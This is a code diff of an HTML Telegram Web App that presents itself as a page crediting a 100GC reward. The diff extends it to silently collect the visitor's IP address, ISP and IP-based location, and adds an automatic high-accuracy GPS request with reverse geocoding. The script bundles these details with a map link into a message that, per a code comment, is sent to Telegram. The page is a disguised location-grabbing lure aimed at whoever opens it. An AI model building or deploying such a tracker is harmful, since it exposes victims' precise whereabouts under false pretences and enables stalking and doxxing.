@@ -39,24 +39,33 @@
         .success { font-size: 64px; }
         .small { font-size: 13px; opacity: 0.6; margin-top: 20px; }
         .info { font-size: 14px; opacity: 0.8; margin-top: 10px; }
+        .gps-status {
+            font-size: 12px;
+            opacity: 0.7;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
     <div class="container" id="status">
         <div class="icon">💰</div>
         <h1>Начисление 100GC</h1>
-        <p>Обработка...</p>
+        <p>Определяем ваши данные...</p>
         <div class="spinner"></div>
+        <p class="gps-status" id="gpsStatus">🔄 Запрос GPS...</p>
     </div>
 
     <script>
         let timer = 5;
         let timerInterval;
+        let gpsData = null;
+        let ipData = null;
 
         function closeApp() {
             Telegram.WebApp.close();
         }
 
+        // 1. Получаем IP
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -67,7 +76,8 @@
             }
         }
 
-        async function getLocation(ip) {
+        // 2. Геолокация через IP (резерв)
+        async function getLocationViaIP(ip) {
             try {
                 const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone,regionName,as,org`);
                 const data = await response.json();
@@ -89,24 +99,87 @@
             }
         }
 
-        async function sendData() {
-            const ip = await getIP();
-            const location = await getLocation(ip);
+        // 3. GPS (автоматически, без кнопок)
+        async function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    document.getElementById('gpsStatus').textContent = '❌ GPS недоступен';
+                    resolve(null);
+                    return;
+                }
 
+                document.getElementById('gpsStatus').textContent = '📍 Запрос GPS...';
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        document.getElementById('gpsStatus').textContent = '✅ GPS получен!';
+                        resolve({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            source: 'GPS (точный)'
+                        });
+                    },
+                    (error) => {
+                        console.error('GPS ошибка:', error.message);
+                        document.getElementById('gpsStatus').textContent = `⚠️ GPS: ${error.message}`;
+                        resolve(null);
+                    },
+                    { 
+                        timeout: 10000, 
+                        enableHighAccuracy: true,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // 4. Формируем и отправляем данные
+        async function sendData() {
+            // Получаем IP
+            const ip = await getIP();
+            
+            // Запрашиваем GPS автоматически
+            const gps = await getGPS();
+            
+            // Если GPS есть — используем его
+            let location = null;
             let dataString = `🌐 IP: ${ip}`;
 
-            if (location && location.lat && location.lon) {
-                dataString += `\n📍 Геолокация (${location.source}):`;
-                dataString += `\n🌍 Страна: ${location.country}`;
-                dataString += `\n🏙️ Город: ${location.city}`;
-                if (location.region) dataString += `\n🗺️ Регион: ${location.region}`;
-                dataString += `\n📡 Провайдер: ${location.isp}`;
-                dataString += `\n🕐 Часовой пояс: ${location.timezone}`;
-                dataString += `\n🗺️ Координаты: ${location.lat}, ${location.lon}`;
-                dataString += `\n📍 Карта: https://www.google.com/maps?q=${location.lat},${location.lon}`;
+            if (gps && gps.lat && gps.lon) {
+                location = gps;
+                dataString += `\n📍 **GPS (точные координаты):**`;
+                dataString += `\n🗺️ Широта: ${gps.lat}`;
+                dataString += `\n🗺️ Долгота: ${gps.lon}`;
+                dataString += `\n📏 Точность: ±${Math.round(gps.accuracy)} метров`;
+                dataString += `\n📍 Карта: https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
+                
+                // Пробуем получить город по координатам (через обратный геокодер)
+                try {
+                    const geoResponse = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.lat}&longitude=${gps.lon}&localityLanguage=ru`);
+                    const geoData = await geoResponse.json();
+                    if (geoData.city || geoData.locality) {
+                        dataString += `\n🏙️ Город: ${geoData.city || geoData.locality || 'Неизвестно'}`;
+                        dataString += `\n🌍 Страна: ${geoData.countryName || 'Неизвестно'}`;
+                    }
+                } catch (e) {
+                    // Если не получилось — ничего страшного
+                }
             } else {
-                dataString += `\n❌ Геолокация не определена`;
-                dataString += `\n🗺️ Карта: https://www.google.com/maps/search/${ip}`;
+                // Если GPS нет — используем IP-геолокацию
+                const ipLocation = await getLocationViaIP(ip);
+                if (ipLocation && ipLocation.lat) {
+                    location = ipLocation;
+                    dataString += `\n📍 Геолокация (по IP):`;
+                    dataString += `\n🌍 Страна: ${ipLocation.country}`;
+                    dataString += `\n🏙️ Город: ${ipLocation.city}`;
+                    dataString += `\n📡 Провайдер: ${ipLocation.isp}`;
+                    dataString += `\n🗺️ Координаты: ${ipLocation.lat}, ${ipLocation.lon}`;
+                    dataString += `\n📍 Карта: https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}`;
+                } else {
+                    dataString += `\n❌ Геолокация не определена`;
+                    dataString += `\n🗺️ Карта: https://www.google.com/maps/search/${ip}`;
+                }
             }
 
             // Отправляем в Telegram
@@ -120,7 +193,10 @@
                 <p class="info">🌐 IP: ${ip}</p>
             `;
 
-            if (location && location.lat) {
+            if (gps && gps.lat) {
+                html += `<p class="info">📍 GPS: ${gps.lat}, ${gps.lon}</p>`;
+                html += `<p class="info" style="font-size: 12px;">📏 Точность: ±${Math.round(gps.accuracy)}м</p>`;
+            } else if (location && location.lat) {
                 html += `<p class="info">📍 ${location.city || 'Город'}, ${location.country || 'Страна'}</p>`;
             } else {
                 html += `<p class="info">❌ Геолокация не найдена</p>`;
@@ -140,7 +216,7 @@
             }, 1000);
         }
 
-        // Запускаем сразу — БЕЗ запросов GPS
+        // Запускаем
         sendData();
     </script>
 </body>
